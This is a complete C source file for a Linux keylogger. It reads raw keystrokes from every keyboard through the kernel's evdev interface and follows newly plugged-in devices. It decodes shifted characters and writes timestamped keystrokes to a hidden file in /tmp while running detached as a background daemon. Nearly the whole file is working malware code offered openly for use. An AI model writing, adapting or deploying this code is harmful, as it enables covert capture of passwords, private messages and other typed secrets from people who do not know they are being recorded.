/*
 * keylogger.c - Linux evdev-based keylogger
 *
 * Captures keystrokes directly from the kernel's input subsystem (evdev).
 * Supports multiple keyboards, hotplug detection via inotify, and a
 * configuration file. Runs as a daemon by default.
 *
 * Compile:  gcc -Wall -Wextra -O2 -pedantic -o keylogger keylogger.c -lrt
 * Config:   /etc/keylogger.conf  or  ~/.keylogger.conf
 *
 * Licensed under GPLv3.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <limits.h>

// ---------------------------------------------------------------------------
// Defaults
// ---------------------------------------------------------------------------
#define LOG_FILE_DEFAULT   "/tmp/.keylog"
#define PID_FILE           "/tmp/keylogger.pid"
#define CONF_FILE_SYSTEM   "/etc/keylogger.conf"
#define CONF_FILE_USER     ".keylogger.conf"
#define POLL_TIMEOUT_MS    1000
#define MAX_KEYBOARDS      32
#define KEY_MAP_SIZE       256
#define CONF_LINE_MAX      512
#define EVENT_BUF_LEN      64
#define INOTIFY_BUF_LEN    (sizeof(struct inotify_event) + NAME_MAX + 1)

// ---------------------------------------------------------------------------
// Configuration (parsed from config file)
// ---------------------------------------------------------------------------
typedef struct {
    char log_file[PATH_MAX];
    int  foreground;
    int  debug;
} config_t;

static config_t config = {
    .log_file   = LOG_FILE_DEFAULT,
    .foreground = 0,
    .debug      = 0,
};

// ---------------------------------------------------------------------------
// Global state
// ---------------------------------------------------------------------------
static volatile sig_atomic_t keep_running = 1;

// ---------------------------------------------------------------------------
// Modifier state
// ---------------------------------------------------------------------------
static int shift_pressed = 0;
static int ctrl_pressed  = 0;
static int alt_pressed   = 0;
static int caps_lock_on  = 0;

// ---------------------------------------------------------------------------
// Signal handler
// ---------------------------------------------------------------------------
static void signal_handler(int sig) {
    (void)sig;
    keep_running = 0;
}

// ---------------------------------------------------------------------------
// Key map (US QWERTY layout, extended to KEY_CNT)
// ---------------------------------------------------------------------------
static const char *key_map[KEY_MAP_SIZE] = {
    [KEY_RESERVED]     = "[RESERVED]",
    [KEY_ESC]          = "[ESC]",
    [KEY_1]            = "1",            [KEY_2]  = "2",
    [KEY_3]            = "3",            [KEY_4]  = "4",
    [KEY_5]            = "5",            [KEY_6]  = "6",
    [KEY_7]            = "7",            [KEY_8]  = "8",
    [KEY_9]            = "9",            [KEY_0]  = "0",
    [KEY_MINUS]        = "-",            [KEY_EQUAL]      = "=",
    [KEY_BACKSPACE]    = "[BACKSPACE]",  [KEY_TAB]        = "[TAB]",
    [KEY_Q]            = "q",            [KEY_W]          = "w",
    [KEY_E]            = "e",            [KEY_R]          = "r",
    [KEY_T]            = "t",            [KEY_Y]          = "y",
    [KEY_U]            = "u",            [KEY_I]          = "i",
    [KEY_O]            = "o",            [KEY_P]          = "p",
    [KEY_LEFTBRACE]    = "[",            [KEY_RIGHTBRACE] = "]",
    [KEY_ENTER]        = "[ENTER]",      [KEY_LEFTCTRL]   = "[CTRL]",
    [KEY_A]            = "a",            [KEY_S]          = "s",
    [KEY_D]            = "d",            [KEY_F]          = "f",
    [KEY_G]            = "g",            [KEY_H]          = "h",
    [KEY_J]            = "j",            [KEY_K]          = "k",
    [KEY_L]            = "l",            [KEY_SEMICOLON]  = ";",
    [KEY_APOSTROPHE]   = "'",            [KEY_GRAVE]      = "`",
    [KEY_LEFTSHIFT]    = "[SHIFT]",      [KEY_BACKSLASH]  = "\\",
    [KEY_Z]            = "z",            [KEY_X]          = "x",
    [KEY_C]            = "c",            [KEY_V]          = "v",
    [KEY_B]            = "b",            [KEY_N]          = "n",
    [KEY_M]            = "m",            [KEY_COMMA]      = ",",
    [KEY_DOT]          = ".",            [KEY_SLASH]      = "/",
    [KEY_RIGHTSHIFT]   = "[SHIFT]",      [KEY_KPASTERISK] = "*",
    [KEY_LEFTALT]      = "[ALT]",        [KEY_SPACE]      = "[SPACE]",
    [KEY_CAPSLOCK]     = "[CAPSLOCK]",
    [KEY_F1]           = "[F1]",         [KEY_F2]   = "[F2]",
    [KEY_F3]           = "[F3]",         [KEY_F4]   = "[F4]",
    [KEY_F5]           = "[F5]",         [KEY_F6]   = "[F6]",
    [KEY_F7]           = "[F7]",         [KEY_F8]   = "[F8]",
    [KEY_F9]           = "[F9]",         [KEY_F10]  = "[F10]",
    [KEY_F11]          = "[F11]",        [KEY_F12]  = "[F12]",
    [KEY_NUMLOCK]      = "[NUMLOCK]",
    [KEY_SCROLLLOCK]   = "[SCROLLLOCK]",
    [KEY_HOME]         = "[HOME]",       [KEY_UP]         = "[UP]",
    [KEY_PAGEUP]       = "[PAGEUP]",     [KEY_KPMINUS]    = "-",
    [KEY_LEFT]         = "[LEFT]",
    [KEY_RIGHT]        = "[RIGHT]",      [KEY_KPPLUS]     = "+",
    [KEY_END]          = "[END]",        [KEY_DOWN]       = "[DOWN]",
    [KEY_PAGEDOWN]     = "[PAGEDOWN]",   [KEY_INSERT]     = "[INSERT]",
    [KEY_DELETE]       = "[DELETE]",
    [KEY_KP0]          = "0",            [KEY_KP1]  = "1",
    [KEY_KP2]          = "2",            [KEY_KP3]  = "3",
    [KEY_KP4]          = "4",            [KEY_KP5]  = "5",
    [KEY_KP6]          = "6",            [KEY_KP7]  = "7",
    [KEY_KP8]          = "8",            [KEY_KP9]  = "9",
    [KEY_KPDOT]        = ".",            [KEY_KPSLASH]    = "/",
    [KEY_KPENTER]      = "[ENTER]",
    [KEY_LEFTMETA]     = "[META]",       [KEY_RIGHTMETA]  = "[META]",
    [KEY_COMPOSE]      = "[COMPOSE]",
    [KEY_PAUSE]        = "[PAUSE]",
    [KEY_MENU]         = "[MENU]",
    [KEY_SYSRQ]        = "[SYSRQ]",
    [KEY_STOP]         = "[STOP]",
    [KEY_AGAIN]        = "[AGAIN]",
    [KEY_PROPS]        = "[PROPS]",
    [KEY_UNDO]         = "[UNDO]",
    [KEY_FRONT]        = "[FRONT]",
    [KEY_COPY]         = "[COPY]",
    [KEY_OPEN]         = "[OPEN]",
    [KEY_PASTE]        = "[PASTE]",
    [KEY_FIND]         = "[FIND]",
    [KEY_CUT]          = "[CUT]",
    [KEY_HELP]         = "[HELP]",
    [KEY_KPEQUAL]      = "=",
    [KEY_KPCOMMA]      = ",",
    [KEY_F13]          = "[F13]",        [KEY_F14] = "[F14]",
    [KEY_F15]          = "[F15]",        [KEY_F16] = "[F16]",
    [KEY_F17]          = "[F17]",        [KEY_F18] = "[F18]",
    [KEY_F19]          = "[F19]",        [KEY_F20] = "[F20]",
    [KEY_F21]          = "[F21]",        [KEY_F22] = "[F22]",
    [KEY_F23]          = "[F23]",        [KEY_F24] = "[F24]",
};

// ---------------------------------------------------------------------------
// Shift-symbol mapping for US QWERTY
// ---------------------------------------------------------------------------
static const char *shift_symbol(unsigned int code) {
    switch (code) {
        case KEY_1:          return "!";
        case KEY_2:          return "@";
        case KEY_3:          return "#";
        case KEY_4:          return "$";
        case KEY_5:          return "%";
        case KEY_6:          return "^";
        case KEY_7:          return "&";
        case KEY_8:          return "*";
        case KEY_9:          return "(";
        case KEY_0:          return ")";
        case KEY_MINUS:      return "_";
        case KEY_EQUAL:      return "+";
        case KEY_GRAVE:      return "~";
        case KEY_LEFTBRACE:  return "{";
        case KEY_RIGHTBRACE: return "}";
        case KEY_BACKSLASH:  return "|";
        case KEY_SEMICOLON:  return ":";
        case KEY_APOSTROPHE: return "\"";
        case KEY_COMMA:      return "<";
        case KEY_DOT:        return ">";
        case KEY_SLASH:      return "?";
        default:             return NULL;
    }
}

// ---------------------------------------------------------------------------
// Modifier updates
// ---------------------------------------------------------------------------
static void update_modifiers(unsigned int code, int value) {
    int pressed = (value == 1 || value == 2);
    switch (code) {
        case KEY_LEFTSHIFT:  case KEY_RIGHTSHIFT: shift_pressed = pressed; break;
        case KEY_LEFTCTRL:   case KEY_RIGHTCTRL:  ctrl_pressed  = pressed; break;
        case KEY_LEFTALT:    case KEY_RIGHTALT:   alt_pressed   = pressed; break;
        case KEY_CAPSLOCK:   if (value == 1) caps_lock_on = !caps_lock_on; break;
    }
}

// ---------------------------------------------------------------------------
// Key code to string conversion (thread-safe, uses caller buffer)
// Returns string length or 0 if no output should be logged
// ---------------------------------------------------------------------------
static int key_to_string(unsigned int code, int value, char *out, size_t out_size) {
    if (value != 1 && value != 2)
        return 0;

    switch (code) {
        case KEY_LEFTSHIFT:  case KEY_RIGHTSHIFT:
        case KEY_LEFTCTRL:   case KEY_RIGHTCTRL:
        case KEY_LEFTALT:    case KEY_RIGHTALT:
        case KEY_CAPSLOCK:
            return 0;
    }

    // Letters with shift/caps (XOR: exactly one of them active)
    if (code >= KEY_A && code <= KEY_Z) {
        int upper = shift_pressed ^ caps_lock_on;
        const char *base = key_map[code];
        if (!base || base[0] == '\0') return 0;
        char c = base[0];
        if (upper) c -= 32;
        if (out_size < 2) return 0;
        out[0] = c;
        out[1] = '\0';
        return 1;
    }

    // Shifted symbols
    if (shift_pressed) {
        const char *sym = shift_symbol(code);
        if (sym) {
            size_t len = strlen(sym);
            if (len < out_size) {
                memcpy(out, sym, len + 1);
                return (int)len;
            }
            return 0;
        }
    }

    // Base mapping (non-letter)
    if (code < KEY_MAP_SIZE) {
        const char *base = key_map[code];
        if (base && base[0] != '\0') {
            size_t len = strlen(base);
            if (len < out_size) {
                memcpy(out, base, len + 1);
                return (int)len;
            }
            return 0;
        }
    }

    // Fallback for unknown key codes
    int n = snprintf(out, out_size, "[UNKNOWN:%u]", code);
    return (n > 0 && (size_t)n < out_size) ? n : 0;
}

// ---------------------------------------------------------------------------
// Write a string to the log file (and stderr if in foreground with debug)
// ---------------------------------------------------------------------------
static void write_log(const char *str) {
    if (!str || !*str) return;

    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    struct tm tm;
    localtime_r(&ts.tv_sec, &tm);
    char timebuf[64];
    strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", &tm);

    // Log to file
    FILE *fp = fopen(config.log_file, "a");
    if (fp) {
        fprintf(fp, "[%s.%06ld] %s\n", timebuf, ts.tv_nsec / 1000, str);
        fflush(fp);
        fclose(fp);
    }

    // Debug output to stderr (foreground mode)
    if (config.debug) {
        fprintf(stderr, "[%s.%06ld] %s\n", timebuf, ts.tv_nsec / 1000, str);
    }
}

// ---------------------------------------------------------------------------
// Check if a device is a keyboard via ioctl
// ---------------------------------------------------------------------------
static int is_keyboard_device(int fd) {
    unsigned long evbit[2] = {0};
    if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), evbit) < 0)
        return 0;
    if (!(evbit[0] & (1 << EV_KEY)))
        return 0;

    unsigned long keybit[8] = {0};
    if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) < 0)
        return 0;
    return (keybit[0] & (1 << KEY_A)) ? 1 : 0;
}

// ---------------------------------------------------------------------------
// Try to open a keyboard by event device index
// ---------------------------------------------------------------------------
static int open_keyboard_by_index(int idx) {
    char path[64];
    snprintf(path, sizeof(path), "/dev/input/event%d", idx);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0) return -1;
    if (!is_keyboard_device(fd)) {
        close(fd);
        return -1;
    }
    return fd;
}

// ---------------------------------------------------------------------------
// Scan all /dev/input/event* and return keyboard fds
// ---------------------------------------------------------------------------
static int scan_keyboards(int *fds, int max_count) {
    int count = 0;
    for (int i = 0; i < 32 && count < max_count; i++) {
        int fd = open_keyboard_by_index(i);
        if (fd >= 0) {
            fds[count++] = fd;
            if (config.debug)
                fprintf(stderr, "[DEBUG] keyboard: /dev/input/event%d\n", i);
        }
    }
    return count;
}

// ---------------------------------------------------------------------------
// Close all keyboard file descriptors
// ---------------------------------------------------------------------------
static void close_keyboards(int *fds, int count) {
    for (int i = 0; i < count; i++) {
        if (fds[i] >= 0) close(fds[i]);
    }
}

// ---------------------------------------------------------------------------
// Parse a single config line (key = value)
// ---------------------------------------------------------------------------
static void parse_config_line(const char *line) {
    char buf[CONF_LINE_MAX];
    size_t len = strlen(line);
    if (len == 0 || len >= sizeof(buf)) return;
    memcpy(buf, line, len + 1);

    // Strip trailing newline/carriage return
    while (len > 0 && (buf[len-1] == '\n' || buf[len-1] == '\r'))
        buf[--len] = '\0';

    // Skip empty lines and comments
    char *p = buf;
    while (*p == ' ' || *p == '\t') p++;
    if (*p == '\0' || *p == '#' || *p == ';') return;

    // Find = separator
    char *eq = strchr(p, '=');
    if (!eq) return;

    // Key (trimmed)
    *eq = '\0';
    char *key = p;
    char *end = key + strlen(key) - 1;
    while (end > key && (*end == ' ' || *end == '\t')) *end-- = '\0';

    // Value (trimmed)
    char *val = eq + 1;
    while (*val == ' ' || *val == '\t') val++;
    end = val + strlen(val) - 1;
    while (end > val && (*end == ' ' || *end == '\t')) *end-- = '\0';

    // Strip optional quotes from value
    if (val[0] == '"') {
        size_t vlen = strlen(val);
        if (vlen > 0 && val[vlen-1] == '"') {
            val[vlen-1] = '\0';
            val++;
        }
    }

    if (strcmp(key, "log_file") == 0)
        snprintf(config.log_file, sizeof(config.log_file), "%s", val);
    else if (strcmp(key, "foreground") == 0)
        config.foreground = (strcmp(val, "1") == 0 || strcmp(val, "yes") == 0 || strcmp(val, "true") == 0);
    else if (strcmp(key, "debug") == 0)
        config.debug = (strcmp(val, "1") == 0 || strcmp(val, "yes") == 0 || strcmp(val, "true") == 0);
}

// ---------------------------------------------------------------------------
// Load configuration from a file
// ---------------------------------------------------------------------------
static void load_config(const char *path) {
    FILE *fp = fopen(path, "r");
    if (!fp) return;
    char line[CONF_LINE_MAX];
    while (fgets(line, sizeof(line), fp)) {
        parse_config_line(line);
    }
    fclose(fp);
    if (config.debug)
        fprintf(stderr, "[DEBUG] config loaded: %s\n", path);
}

// ---------------------------------------------------------------------------
// Initialize configuration from all known sources
// ---------------------------------------------------------------------------
static void init_config() {
    char user_conf[PATH_MAX];
    const char *home = getenv("HOME");
    if (home) {
        snprintf(user_conf, sizeof(user_conf), "%s/%s", home, CONF_FILE_USER);
        load_config(user_conf);
    }
    load_config(CONF_FILE_SYSTEM);
}

// ---------------------------------------------------------------------------
// Print usage
// ---------------------------------------------------------------------------
static void print_usage(const char *prog) {
    fprintf(stderr, "Usage: %s [OPTIONS]\n", prog);
    fprintf(stderr, "  -f, --foreground    Run in foreground (do not daemonize)\n");
    fprintf(stderr, "  -d, --debug         Enable debug output (implies -f)\n");
    fprintf(stderr, "  -c, --config FILE   Use alternative config file\n");
    fprintf(stderr, "  -h, --help          Show this help\n");
}

// ---------------------------------------------------------------------------
// Process event from a keyboard device
// ---------------------------------------------------------------------------
static void process_event(struct input_event *ev) {
    if (ev->type != EV_KEY) return;
    update_modifiers(ev->code, ev->value);
    char buf[64];
    if (key_to_string(ev->code, ev->value, buf, sizeof(buf))) {
        write_log(buf);
    }
}

// ---------------------------------------------------------------------------
// Handle inotify event (new/removed devices in /dev/input)
// ---------------------------------------------------------------------------
static int handle_inotify(int inotify_fd, int *fds, int *count) {
    char inotify_buf[INOTIFY_BUF_LEN];
    ssize_t len = read(inotify_fd, inotify_buf, sizeof(inotify_buf));
    if (len <= 0) return 0;

    // Re-scan for keyboard devices
    int new_count = scan_keyboards(fds, MAX_KEYBOARDS);
    if (new_count > *count) {
        if (config.debug)
            fprintf(stderr, "[DEBUG] new keyboards found: %d\n", new_count - *count);
    } else if (new_count < *count) {
        if (config.debug)
            fprintf(stderr, "[DEBUG] keyboards removed: %d\n", *count - new_count);
    }
    *count = new_count;
    return new_count;
}

// ---------------------------------------------------------------------------
// Main keylogger loop
// ---------------------------------------------------------------------------
static void run_keylogger() {
    int fds[MAX_KEYBOARDS];
    int keyboard_count = scan_keyboards(fds, MAX_KEYBOARDS);

    if (keyboard_count == 0) {
        fprintf(stderr, "No keyboard devices found. Waiting for hotplug...\n");
    }

    // Set up inotify on /dev/input
    int inotify_fd = inotify_init1(IN_NONBLOCK);
    int inotify_watch = -1;
    if (inotify_fd >= 0) {
        inotify_watch = inotify_add_watch(inotify_fd, "/dev/input",
                                          IN_CREATE | IN_ATTRIB | IN_DELETE);
        if (inotify_watch < 0 && config.debug)
            fprintf(stderr, "[DEBUG] inotify watch on /dev/input failed: %s\n",
                    strerror(errno));
    }

    struct input_event ev;
    struct pollfd *pfds = NULL;
    int pfd_count = 0;
    int pfd_capacity = 0;

    while (keep_running) {
        // Build poll fd set: keyboard fds + inotify fd
        int needed = keyboard_count + (inotify_watch >= 0 ? 1 : 0);
        if (needed > pfd_capacity) {
            free(pfds);
            pfd_capacity = needed + 4;
            pfds = malloc(sizeof(struct pollfd) * pfd_capacity);
            if (!pfds) {
                fprintf(stderr, "malloc failed\n");
                break;
            }
        }
        pfd_count = 0;
        for (int i = 0; i < keyboard_count; i++) {
            pfds[pfd_count].fd = fds[i];
            pfds[pfd_count].events = POLLIN;
            pfd_count++;
        }
        if (inotify_watch >= 0) {
            pfds[pfd_count].fd = inotify_fd;
            pfds[pfd_count].events = POLLIN;
            pfd_count++;
        }

        int ret = poll(pfds, pfd_count, POLL_TIMEOUT_MS);
        if (ret < 0) {
            if (errno == EINTR) continue;
            fprintf(stderr, "poll error: %s\n", strerror(errno));
            break;
        }
        if (ret == 0) continue;

        // Check inotify for device changes
        if (inotify_watch >= 0 && (pfds[pfd_count - 1].revents & POLLIN)) {
            close_keyboards(fds, keyboard_count);
            keyboard_count = scan_keyboards(fds, MAX_KEYBOARDS);
            // Drain inotify events
            handle_inotify(inotify_fd, fds, &keyboard_count);
            continue;
        }

        // Read events from keyboard devices
        for (int i = 0; i < keyboard_count; i++) {
            if (!(pfds[i].revents & POLLIN)) continue;

            while (1) {
                ssize_t n = read(fds[i], &ev, sizeof(ev));
                if (n < 0) {
                    if (errno == EAGAIN || errno == EWOULDBLOCK) break;
                    // Device error, close and try to reopen later
                    close(fds[i]);
                    fds[i] = -1;
                    break;
                }
                if ((size_t)n != sizeof(ev)) continue;
                process_event(&ev);
            }
        }

        // Clean up dead fds and attempt reconnection
        int dead_count = 0;
        for (int i = 0; i < keyboard_count; i++) {
            if (fds[i] < 0) {
                dead_count++;
                // Compact: shift remaining fds
                for (int j = i; j < keyboard_count - 1; j++)
                    fds[j] = fds[j + 1];
                keyboard_count--;
                i--;
            }
        }
        // Re-scan for new keyboards if any died
        if (dead_count > 0) {
            int new_count = scan_keyboards(fds + keyboard_count,
                                           MAX_KEYBOARDS - keyboard_count);
            keyboard_count += new_count;
        }
    }

    free(pfds);
    close_keyboards(fds, keyboard_count);
    if (inotify_watch >= 0) inotify_rm_watch(inotify_fd, inotify_watch);
    if (inotify_fd >= 0) close(inotify_fd);
}

// ---------------------------------------------------------------------------
// Daemonize (fork, detach from terminal)
// ---------------------------------------------------------------------------
static void daemonize() {
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    if (pid > 0) exit(EXIT_SUCCESS);

    if (setsid() < 0) {
        perror("setsid");
        exit(EXIT_FAILURE);
    }

    signal(SIGCHLD, SIG_IGN);

    pid = fork();
    if (pid < 0) {
        perror("fork2");
        exit(EXIT_FAILURE);
    }
    if (pid > 0) exit(EXIT_SUCCESS);

    chdir("/");

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------
int main(int argc, char *argv[]) {
    // Parse CLI args before config so -c overrides defaults
    const char *config_file = NULL;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_usage(argv[0]);
            return 0;
        } else if (strcmp(argv[i], "-f") == 0 || strcmp(argv[i], "--foreground") == 0) {
            config.foreground = 1;
        } else if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--debug") == 0) {
            config.debug = 1;
            config.foreground = 1;
        } else if ((strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--config") == 0) && i + 1 < argc) {
            config_file = argv[++i];
        }
    }

    // Load configuration
    init_config();
    if (config_file) load_config(config_file);

    // Setup signals
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

    // Daemonize unless foreground mode
    if (!config.foreground) {
        daemonize();
    }

    // Write PID file
    FILE *pid_fp = fopen(PID_FILE, "w");
    if (pid_fp) {
        fprintf(pid_fp, "%d\n", getpid());
        fclose(pid_fp);
    }

    run_keylogger();

    // Clean up PID file
    unlink(PID_FILE);
    return 0;
}
